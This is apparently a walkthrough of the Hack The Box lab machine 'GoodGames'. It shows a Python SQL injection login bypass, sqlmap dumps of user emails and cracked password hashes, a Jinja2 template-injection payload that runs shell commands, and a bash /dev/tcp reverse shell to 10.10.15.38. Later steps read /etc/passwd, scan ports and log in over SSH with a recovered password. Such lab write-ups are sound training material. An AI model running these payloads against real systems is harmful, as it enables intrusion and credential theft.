+</p><h1 id="7ad973d8-c502-415e-b72d-daf6e8126e5a" class="">2.Enumeration</h1><figure id="15cfb075-0c3d-49e7-be2b-4c43f1c74172" class="image"><a href="Good%20Games%2015cfb/Untitled.png"><img style="width:1920px" src="Good%20Games%2015cfb/Untitled.png"/></a></figure><p id="9ac08436-6b40-47d1-a06d-cb0f95f71af6" class="">found a website and login system lets try to bypass it</p><p id="520390d6-14b9-4805-9373-bbae4fe0a8b5" class="">
+</p><p id="c2213f2b-2616-4a8e-8bc0-97e352a00fac" class="">Lets try using sql injection with python script</p><pre id="4a068004-b148-47de-a8ce-b2af14d2c248" class="code"><code>#!/usr/bin/env python3
+
+import requests
+
+url = &quot;http://goodgames.htb/&quot;
+
+s = requests.Session()
+
+r = s.post(
+	url + &quot;login&quot;,
+	data={
+		&quot;email&quot; : &quot;&#x27; OR 1 = 1 #&quot;,
+		&quot;password&quot; : &quot;password&quot;,
+	},
+
+)
+
+print(r.text)</code></pre><p id="b154b875-da5d-4675-b10d-3c382084e7e7" class="">
+</p><p id="35612010-a24e-4a3f-ba2f-6c3f94212237" class="">got a successful login with this sql injection </p><p id="283fcc55-187a-417a-96ab-b9f19a69b238" class="">
+</p><pre id="de9bc0c7-c59e-446a-962c-f02b3fa4d759" class="code"><code>&lt;!DOCTYPE html&gt;
+
+    
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+
+    &lt;title&gt;GoodGames | Login Success&lt;/title&gt;
+
+    &lt;meta name=&quot;description&quot; content=&quot;GoodGames - Bootstrap template for communities and games store&quot;&gt;
+    &lt;meta name=&quot;keywords&quot; content=&quot;game, gaming, template, HTML template, responsive, Bootstrap, premium&quot;&gt;
+    &lt;meta name=&quot;author&quot; content=&quot;_nK&quot;&gt;
+    &lt;meta http-equiv=&quot;refresh&quot; content=&quot;5; url=/profile&quot; /&gt;
+
+    &lt;link rel=&quot;icon&quot; type=&quot;image/png&quot; href=&quot;static/images/favicon.png&quot;&gt;
+
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
+
+    &lt;!-- START: Styles --&gt;
+
+    &lt;!-- Google Fonts --&gt;
+    &lt;link href=&quot;https://fonts.googleapis.com/css?family=Montserrat:400,700%7cOpen+Sans:400,700&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;
+
+    &lt;!-- Bootstrap --&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;static/vendor/bootstrap/dist/css/bootstrap.min.css&quot;&gt;</code></pre><p id="117bee61-cedb-4d2d-9a15-7c8b4907a196" class="">
+</p><p id="4474a4b6-48b9-45cb-8416-e591b5cf6ed3" class="">If we have sql injection here , we can try sqlmap for database</p><p id="c95673e7-f6d5-4f2d-b9f0-0e74a53c997e" class="">
+</p><p id="47e685d2-23e1-4126-9c18-77beb705bf90" class="">First we tried to check injection with email and password field </p><pre id="aa9fb398-ab8e-44b4-a5d7-34466b56dcd9" class="code"><code>──(ezio㉿kali)-[~/htb/goodgames]
+└─$ sqlmap -u http://goodgames.htb/login --data &#x27;email=a&amp;password=b&#x27;                                           
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.6#stable}
+|_ -| . [)]     | .&#x27;| . |
+|___|_  [&quot;]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:24:03 /2022-02-25/
+
+[18:24:04] [INFO] testing connection to the target URL
+[18:24:05] [INFO] checking if the target is protected by some kind of WAF/IPS
+[18:24:05] [INFO] testing if the target URL content is stable
+[18:24:05] [INFO] target URL content is stable
+[18:24:05] [INFO] testing if POST parameter &#x27;email&#x27; is dynamic
+[18:24:05] [WARNING] POST parameter &#x27;email&#x27; does not appear to be dynamic
+[18:24:06] [WARNING] heuristic (basic) test shows that POST parameter &#x27;email&#x27; might not be injectable
+[18:24:06] [INFO] testing for SQL injection on POST parameter &#x27;email&#x27;
+[18:24:06] [INFO] testing &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;
+[18:24:09] [INFO] testing &#x27;Boolean-based blind - Parameter replace (original value)&#x27;
+[18:24:10] [INFO] testing &#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;
+[18:24:11] [INFO] testing &#x27;PostgreSQL AND error-based - WHERE or HAVING clause&#x27;
+[18:24:12] [INFO] testing &#x27;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&#x27;
+[18:24:13] [INFO] testing &#x27;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#x27;
+[18:24:14] [INFO] testing &#x27;Generic inline queries&#x27;
+[18:24:14] [INFO] testing &#x27;PostgreSQL &gt; 8.1 stacked queries (comment)&#x27;
+[18:24:15] [INFO] testing &#x27;Microsoft SQL Server/Sybase stacked queries (comment)&#x27;
+[18:24:16] [INFO] testing &#x27;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&#x27;
+[18:24:17] [INFO] testing &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;
+[18:24:28] [INFO] POST parameter &#x27;email&#x27; appears to be &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27; injectable 
+it looks like the back-end DBMS is &#x27;MySQL&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+for the remaining tests, do you want to include all tests for &#x27;MySQL&#x27; extending provided level (1) and risk (1) values? [Y/n] y
+[18:24:35] [INFO] testing &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;
+[18:24:35] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[18:24:36] [INFO] &#x27;ORDER BY&#x27; technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[18:24:37] [INFO] target URL appears to have 4 columns in query
+got a refresh intent (redirect like response common to login pages) to &#x27;/profile&#x27;. Do you want to apply it from now on? [Y/n] n
+[18:24:41] [INFO] POST parameter &#x27;email&#x27; is &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27; injectable
+POST parameter &#x27;email&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 60 HTTP(s) requests:
+---
+Parameter: email (POST)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: email=a&#x27; AND (SELECT 4583 FROM (SELECT(SLEEP(5)))PZlB) AND &#x27;zGOl&#x27;=&#x27;zGOl&amp;password=b
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: email=a&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716a717671,0x65656f6355745a50434e4177756c756f79566773754377684a6a4870724a5a52726953664a726750,0x71707a7071)-- -&amp;password=b
+---
+[18:24:43] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL &gt;= 5.0.12
+[18:24:44] [INFO] fetched data logged to text files under &#x27;/home/ezio/.local/share/sqlmap/output/goodgames.htb&#x27;
+
+[*] ending @ 18:24:44 /2022-02-25/</code></pre><p id="1c38db7a-0fc2-4ec2-b1ed-abc8b3dc5aba" class="">got success</p><p id="b454654a-94af-476e-8cff-21bef4c2f756" class="">
+</p><p id="4eec0ac0-d387-42a1-a078-3460587bc0c8" class="">Lets try to retrieve some tables from data base</p><pre id="aa476484-100e-477a-be73-a341c38ba057" class="code"><code>──(ezio㉿kali)-[~/htb/goodgames]
+└─$ sqlmap -u http://goodgames.htb/login --data &#x27;email=a&amp;password=b&#x27; --batch -D main --tables
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.6#stable}
+|_ -| . [&quot;]     | .&#x27;| . |
+|___|_  [&quot;]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:28:22 /2022-02-25/
+
+[18:28:22] [INFO] resuming back-end DBMS &#x27;mysql&#x27; 
+[18:28:22] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: email (POST)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: email=a&#x27; AND (SELECT 4583 FROM (SELECT(SLEEP(5)))PZlB) AND &#x27;zGOl&#x27;=&#x27;zGOl&amp;password=b
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: email=a&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716a717671,0x65656f6355745a50434e4177756c756f79566773754377684a6a4870724a5a52726953664a726750,0x71707a7071)-- -&amp;password=b
+---
+[18:28:23] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL &gt;= 5.0.12
+[18:28:23] [INFO] fetching tables for database: &#x27;main&#x27;
+got a refresh intent (redirect like response common to login pages) to &#x27;/profile&#x27;. Do you want to apply it from now on? [Y/n] Y
+Database: main
+[3 tables]
++---------------+
+| user          |
+| blog          |
+| blog_comments |
++---------------+
+
+[18:28:24] [INFO] fetched data logged to text files under &#x27;/home/ezio/.local/share/sqlmap/output/goodgames.htb&#x27;
+
+[*] ending @ 18:28:24 /2022-02-25/</code></pre><p id="75867605-1a8e-4855-a5c5-4e6e6186c171" class="">Got three tabes here , lets see what is inside the user </p><p id="9522181e-445c-425f-8b72-ed4541f6e738" class="">
+</p><pre id="126d9eec-b088-4ee4-814f-f4485a2ef5d9" class="code"><code>┌──(ezio㉿kali)-[~/htb/goodgames]
+└─$ sqlmap -u http://goodgames.htb/login --data &#x27;email=a&amp;password=b&#x27; --batch -D main -T user --dump
+        ___
+       __H__
+ ___ ___[&#x27;]_____ ___ ___  {1.6#stable}
+|_ -| . [)]     | .&#x27;| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:30:25 /2022-02-25/
+
+[18:30:26] [INFO] resuming back-end DBMS &#x27;mysql&#x27; 
+[18:30:26] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: email (POST)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: email=a&#x27; AND (SELECT 4583 FROM (SELECT(SLEEP(5)))PZlB) AND &#x27;zGOl&#x27;=&#x27;zGOl&amp;password=b
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: email=a&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716a717671,0x65656f6355745a50434e4177756c756f79566773754377684a6a4870724a5a52726953664a726750,0x71707a7071)-- -&amp;password=b
+---
+[18:30:26] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL &gt;= 5.0.12
+[18:30:26] [INFO] fetching columns for table &#x27;user&#x27; in database &#x27;main&#x27;
+got a refresh intent (redirect like response common to login pages) to &#x27;/profile&#x27;. Do you want to apply it from now on? [Y/n] Y
+[18:30:27] [INFO] fetching entries for table &#x27;user&#x27; in database &#x27;main&#x27;
+[18:30:27] [INFO] recognized possible password hashes in column &#x27;password&#x27;
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+[18:30:27] [INFO] using hash method &#x27;md5_generic_passwd&#x27;
+what dictionary do you want to use?
+[1] default dictionary file &#x27;/usr/share/sqlmap/data/txt/wordlist.tx_&#x27; (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+&gt; 1
+[18:30:27] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+[18:30:27] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[18:30:27] [INFO] starting 4 processes 
+[18:30:38] [INFO] cracked password &#x27;hacker&#x27; for hash &#x27;d6a6bc0db10694a2d90e3a69648f3a03&#x27;                                                                                                                                                      
+[18:30:40] [INFO] cracked password &#x27;furkan123&#x27; for hash &#x27;14451c9aab2e08ccd94d7dc384125ad4&#x27;                                                                                                                                                   
+[18:30:50] [INFO] cracked password &#x27;xander&#x27; for hash &#x27;8b28406c698875d68169c0f2fea77af7&#x27;                                                                                                                                                      
+Database: main                                                                                                                                                                                                                               
+Table: user
+[9 entries]
++----+--------+---------------------------+----------------------------------------------+
+| id | name   | email                     | password                                     |
++----+--------+---------------------------+----------------------------------------------+
+| 1  | admin  | admin@goodgames.htb       | 2b22337f218b2d82dfc3b6f77e7cb8ec             |
+| 2  | xander | xander@paper.htb          | 8b28406c698875d68169c0f2fea77af7 (xander)    |
+| 3  | ZAP    | foo-bar@example.com       | 903a98d709fa4683aaaa036b84c125a6             |
+| 4  | hacker | hacker@hacker.com         | d6a6bc0db10694a2d90e3a69648f3a03 (hacker)    |
+| 5  | tesser | tester@mail.com           | 9ff3282ac33d53611b254ed7b7c47798             |
+| 6  | Amit   | amitpinchasi123@gmail.com | 464e9ea7cef954d65dcbfbee78b6a56b             |
+| 7  | aaa    | cisolab286@ishop2k.com    | 61d2475bd7866f46874138b0ef3fa4ee             |
+| 8  | daimon | fozmeny@gmail.com         | 14451c9aab2e08ccd94d7dc384125ad4 (furkan123) |
+| 9  | p4pp0  | dd@cc.com                 | 884dd30ab47cf9d105990e3ad422f912             |
++----+--------+---------------------------+----------------------------------------------+
+
+[18:30:51] [INFO] table &#x27;main.`user`&#x27; dumped to CSV file &#x27;/home/ezio/.local/share/sqlmap/output/goodgames.htb/dump/main/user.csv&#x27;
+[18:30:51] [INFO] fetched data logged to text files under &#x27;/home/ezio/.local/share/sqlmap/output/goodgames.htb&#x27;
+
+[*] ending @ 18:30:51 /2022-02-25/</code></pre><p id="07840ca9-dffe-437d-8ada-7d0580bf1b7a" class="">After dumping whole table found some username , email and hashes . Here we can seee have a admin hash too lets crack it.</p><p id="3bde6faa-0cb6-4101-8dd9-db012439f480" class="">
+</p><p id="c96d79c6-7731-49dd-aecb-2caa6418ddcb" class="">Using crackstation got that hash cracked and found the password</p><p id="fe279428-2263-4037-906c-6a9b908cce72" class="">
+</p><p id="2f34df85-cf2b-4a80-befd-253daa3015c9" class="">Now we can access the login panel</p><figure id="e886a2cd-ad1b-41fd-a7d7-c03d211e24d6" class="image"><a href="Good%20Games%2015cfb/Untitled%201.png"><img style="width:1916px" src="Good%20Games%2015cfb/Untitled%201.png"/></a></figure><p id="a8625147-b754-4803-be61-668ef64184d6" class="">we logged in as admin , let enumerate more</p><p id="c6abe9a6-e9f0-4b1a-a578-795d47c9c795" class="">
+</p><p id="7b90ac85-eefa-4264-9f85-c9639bbc02e5" class="">After enumerating every option ,  found out a subdomain which leads other page . Lets add that our host and try that out</p><p id="a606a0e1-2c8f-42f4-8e09-f4e5bced17cc" class="">
+</p><p id="bd6cec6d-39b6-4e40-a805-e3188bc08459" class="">After adding that to our host , we can see a flask volt sign in page</p><figure id="c3e3a6b7-f1c8-4353-9aca-4b9ea71bd5cb" class="image"><a href="Good%20Games%2015cfb/Untitled%202.png"><img style="width:1919px" src="Good%20Games%2015cfb/Untitled%202.png"/></a></figure><p id="3601e51f-0a8e-478b-a94c-4cee175a0e8a" class="">we can see flask framework is used for this page , lets try login with same credentials</p><p id="9a3d5b81-052c-4042-8fbe-0b82588fd480" class="">
+</p><p id="f0d4d7e1-16a6-4766-8a7f-c7598f2f7a3b" class="">Same creds work , got in</p><figure id="22fb987d-9108-4c9f-a997-a2d7ced131ba" class="image"><a href="Good%20Games%2015cfb/Untitled%203.png"><img style="width:1920px" src="Good%20Games%2015cfb/Untitled%203.png"/></a></figure><p id="16c81636-5027-4345-85ce-ab1e2aacb4fd" class="">after enumerating the site found settings of profile . Its using flask framework , so it might be vulnerable to SSTI ( Server Side Template Injection ) . Lets try out a little attack</p><figure id="1a32ca10-bfb1-485a-af1d-f0930f2da614" class="image"><a href="Good%20Games%2015cfb/Untitled%204.png"><img style="width:1920px" src="Good%20Games%2015cfb/Untitled%204.png"/></a></figure><p id="76f397c5-484b-4b71-bf04-0a1de6a120c6" class="">Boom , here we have SSTI ( payload : {{8*8}} ) .</p><p id="462f50bc-b0cd-4b29-bdef-c236f5b5ed88" class="">
+</p><p id="c22bcdbe-cd9a-4e22-9532-8e986bf1ac72" class="">Finding more about SSTI with flask, found out a useful article </p><figure id="224b913c-ea6f-4e66-bca2-b7da6bd08369"><a href="https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">SSTI in Flask/Jinja2</div><div class="bookmark-description">What is SSTI ( Server-Side Template Injection) Server-Side Template Injection is possible when an attacker injects template directive as user input that can execute arbitrary code on the server. If you happen to view the source of a web page and see below code snippets then it is safe to guess that the application is using some template engine to render data.</div></div><div class="bookmark-href">https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee</div></div><img src="https://miro.medium.com/max/1200/1*UwaAIpO6UmRAY_ICQ9xikw.jpeg" class="bookmark-image"/></a></figure><p id="5f2dea92-cc23-4915-a5bb-8387f86c94a7" class="">Got payload for subclasses , to climb up by using python method resolution</p><p id="48b25659-b199-4417-bebf-f7d81f2862b0" class="">
+</p><p id="93669d01-2279-47bf-b073-85156db5155d" class="">using this payload </p><pre id="fba3dc71-e587-45a3-a7ac-ae91014fce12" class="code"><code>{{ &#x27;&#x27;.__class__.__mro__[1].__subclasses__() }}</code></pre><p id="4a8e5dd0-1ff6-4e19-ae08-bbeacf060ca6" class="">got the subclasses , lets find out subclass which will help us determine the injection point for command execution.</p><p id="35d2b35b-9ab5-4a93-8e8d-944249becf4b" class="">
+</p><p id="218d04aa-4dd9-45ac-b8db-87d5d6ca5fb1" class="">Found a class subprocess for our code execution , lets try some command out</p><pre id="14ea0628-1852-4792-8e51-bccd2dc0dea6" class="code"><code>{{ &#x27;&#x27;.__class__.__mro__[1].__subclasses__()[217](&quot;whoami&quot;, shell=True, stdout=-1).stdout.read().decode(&#x27;utf-8&#x27;) }}</code></pre><p id="7db7d953-98f5-44f7-ab8f-2eb61e58f61c" class="">
+</p><p id="764361f4-9917-43d1-988e-180d250d5f90" class="">after executing this command got a reply</p><figure id="a581a957-56ee-46bc-9c5b-0c9f58dd5790" class="image"><a href="Good%20Games%2015cfb/Untitled%205.png"><img style="width:1920px" src="Good%20Games%2015cfb/Untitled%205.png"/></a></figure><p id="0505d919-678f-4e44-a133-9eba1478f01d" class="">
+</p><p id="a0b433c9-1232-45ea-b7c9-7be8c534e295" class="">So we are root here , lets try out injecting a reverse shell code in this</p><p id="c30bd740-4ba2-4dbc-ad71-079b0cd11681" class="">
+</p><hr id="ea572fee-69e2-4daf-b8d6-53d819eb5e95"/><p id="4f96f973-476a-4fba-92f1-9502a6ca7a6f" class="">
+</p><h1 id="f094eb2d-0bb7-4e7b-8a57-b805d5a24286" class="">3.FootHold</h1><pre id="c053fc1f-9072-488a-a54d-80dc9986fbcc" class="code"><code>{{ &#x27;&#x27;.__class__.__mro__[1].__subclasses__()[217](&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.15.38/9999 0&gt;&amp;1&#x27;&quot;, shell=True, stdout=-1).stdout.read().decode(&#x27;utf-8&#x27;) }}</code></pre><p id="1f7f13ef-8ce2-43ad-95d8-c7b0fabfd166" class="">got our reverse shell</p><pre id="2306f9f1-f3ac-4571-ba43-5469d3dbf2a6" class="code"><code>──(ezio㉿kali)-[~/htb/goodgames]
+└─$ nc -lvnp 9999
+listening on [any] 9999 ...
+connect to [10.10.15.38] from (UNKNOWN) [10.10.11.130] 57054
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@3a453ab39d3d:/backend#</code></pre><p id="e4cd2867-521a-409d-979e-792e534a84ba" class="">This machine is running docker container</p><pre id="0c10b935-0d61-403f-ae85-3c1d01f2e538" class="code"><code>root@3a453ab39d3d:/# ls -la
+ls -la
+total 92
+drwxr-xr-x   1 root root 4096 Feb 26 11:06 .
+drwxr-xr-x   1 root root 4096 Feb 26 11:06 ..
+-rwxr-xr-x   1 root root    0 Nov  5 15:23 .dockerenv
+-rw-r--r--   1 root root  399 Feb 25 22:02 .ssh
+drwxr-xr-x   1 root root 4096 Feb 26 16:53 backend
+drwxr-xr-x   1 root root 4096 Nov  5 15:28 bin
+drwxr-xr-x   2 root root 4096 Oct 20  2018 boot
+drwxr-xr-x   5 root root  380 Feb 26 16:19 dev
+drwxr-xr-x   1 root root 4096 Nov  5 15:23 etc
+drwxr-xr-x   1 root root 4096 Feb 25 20:31 home
+drwxr-xr-x   1 root root 4096 Nov 16  2018 lib
+drwxr-xr-x   2 root root 4096 Nov 12  2018 lib64
+drwxr-xr-x   2 root root 4096 Nov 12  2018 media
+drwxr-xr-x   2 root root 4096 Nov 12  2018 mnt
+drwxr-xr-x   2 root root 4096 Nov 12  2018 opt
+dr-xr-xr-x 439 root root    0 Feb 25 05:28 proc
+drwx------   1 root root 4096 Feb 25 21:11 root
+drwxr-xr-x   3 root root 4096 Nov 12  2018 run
+drwxr-xr-x   1 root root 4096 Nov  5 15:28 sbin
+drwxr-xr-x   2 root root 4096 Nov 12  2018 srv
+dr-xr-xr-x  13 root root    0 Feb 25 11:47 sys
+drwxrwxrwt   1 root root 4096 Feb 25 16:19 tmp
+drwxr-xr-x   1 root root 4096 Nov 12  2018 usr
+drwxr-xr-x   1 root root 4096 Nov 12  2018 var</code></pre><p id="b2ed7694-9266-49b1-b156-17c9d0a1bd76" class="">
+</p><p id="f1f4f6ec-ddad-496f-82f7-789f695c8d93" class="">Found a user flag in augustus home , further enumeration for getting root </p><p id="fcbef12f-afbb-4eb1-880d-5aa393fab9af" class="">
+</p><p id="7aa0eaba-8267-4f77-bd61-60a2d631d068" class="">Reading /etc/passwd file . Found there is no user named augustus . But we do have one</p><pre id="7eb45426-36de-48be-a524-86247494791f" class="code"><code>root@3a453ab39d3d:/home/augustus# cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false</code></pre><p id="61e84c4b-0f16-414f-8dc1-7bfc631470e3" class="">
+</p><p id="065d4f9a-b7da-450f-b2d1-993d4fe02e1c" class="">So how the user is not in docker container , but in main machine . Time to enumerate more for root</p><pre id="a26281af-e3b6-4d74-b0b0-3147755093e9" class="code"><code>root@3a453ab39d3d:/home/augustus# ip a s
+ip a s
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+5: eth0@if6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:ac:13:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 172.19.0.2/16 brd 172.19.255.255 scope global eth0
+       valid_lft forever preferred_lft forever</code></pre><p id="6dcc2fd0-fc54-4e8b-a8fd-a2938c851471" class="">found a ip trying to access it with nc using internal network</p><p id="e56118f0-df99-440e-b2dc-f1264e932856" class="">
+</p><p id="b9b9c5e5-15b2-4ec4-849a-09f2a3325d0c" class="">After a try we don’t have nc in the docker</p><p id="5d7d1d74-c1ca-4240-8146-5a49436c2fe6" class="">
+</p><p id="55ef4edd-71fa-4ab7-8c66-dedd1430c480" class="">Trying to check if gateway can be attached to particular port for bash access</p><pre id="4bcdc159-ccb7-440a-8083-1fed464ab359" class="code"><code>for PORT in {1..1000}; do timeout 1s bash -c &quot;&lt;/dev/tcp/172.19.0.1/$PORT&quot; &gt; /dev/null; done</code></pre><p id="76c04d98-9c69-49e8-b9c7-9a66675fdb18" class="">lets run in this our netcat setup</p><p id="b515f499-a04b-4974-9ded-8a12180b0662" class="">
+</p><pre id="671d2137-3d6a-4a05-af1a-252704123d0b" class="code"><code>bash: /dev/tcp/172.19.0.1/21: Connection refused
+bash: connect: Connection refused
+bash: /dev/tcp/172.19.0.1/23: Connection refused</code></pre><p id="8ddee813-abd0-445d-9642-231ad8aeaf91" class=""> we got output , so connection was refused by every port . But found out that ssh port is missing . After checking we have ssh in our netcat session lets try to connect using that. </p><p id="3d0be226-cbf1-4e64-b1c0-9bda6b4e8d75" class="">But its require stable bash, then lets make that</p><pre id="09badacc-fff9-4397-bf1d-401de73189b7" class="code"><code>─$ nc -lvnp 9999  
+listening on [any] 9999 ...
+connect to [10.10.15.38] from (UNKNOWN) [10.10.11.130] 33590
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@3a453ab39d3d:/backend# python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;
+python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</code></pre><p id="ea2f1cb1-204c-4cb6-83cf-cea1e8ff43db" class="">
+</p><hr id="aef8272a-89e1-4013-a0f1-be7156888bd6"/><h1 id="e7efd00a-bfae-4654-a0e7-3e15c8d3b05b" class="">4.Privileage Escalation</h1><p id="1ac05fdd-6e2e-41ce-8490-faa0163edbb3" class="">Now ssh time</p><pre id="29666667-19db-4ba0-8a30-2577f4413b52" class="code"><code>root@3a453ab39d3d:/backend# ssh augustus@172.19.0.1
+ssh augustus@172.19.0.1
+augustus@172.19.0.1&#x27;s password: superadministrator
+
+Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Feb 26 18:13:22 2022 from 172.19.0.2
+augustus@GoodGames:~$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+mysql:x:106:113:MySQL Server,,,:/var/lib/mysql:/bin/false
